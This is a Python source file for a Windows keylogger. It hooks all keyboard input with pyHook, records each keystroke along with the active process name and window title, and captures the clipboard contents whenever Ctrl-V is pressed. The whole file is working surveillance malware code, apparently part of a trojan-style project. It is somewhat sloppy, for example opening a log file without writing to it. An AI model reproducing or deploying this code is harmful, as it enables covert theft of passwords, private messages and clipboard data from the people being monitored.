from __future__ import print_function
from ctypes import *
import pythoncom
import pyHook         #pip install pyHook-1.5 ....
import win32clipboard #pip install pywin32
#import github3

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

log = None

def get_current_process():
    global log
    try:
	print("[*] In Winkeylogger module.")
        log = open("log.log", "w")
        # get a handle to the foreground window
        hwnd = user32.GetForegroundWindow()
        # grab the executable
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))   # find the process ID
        process_id = "%d" % pid.value
        executable = create_string_buffer(b'00', 512) #"\x00",
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        # now read its title
        window_title =create_string_buffer(b'00', 512)
        length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    except:
        print("Exception has been raised!")
        exit(1)
    print("\n[ %s - %s ]\n" % (str(executable.value).split('b')[1], str(window_title.value).split('b')[1]))

    # close handles and file
    log.close()
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    global current_window
    global log
    log = open("log.log", "w")
    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii))
    else:
        # if [Ctrl-V], get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - %s" % (pasted_value))
        else:
            print("[%s:%d]" % (event.Key,event.Ascii))
            
    # close file and pass execution to next hook registered
    log.close()
    return True

#import ctypes
#b = ctypes.create_string_buffer(b'HI?', 5)
#print(ctypes.sizeof(b))
#print(b.value)
#x=input("zqit")
# create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()

    

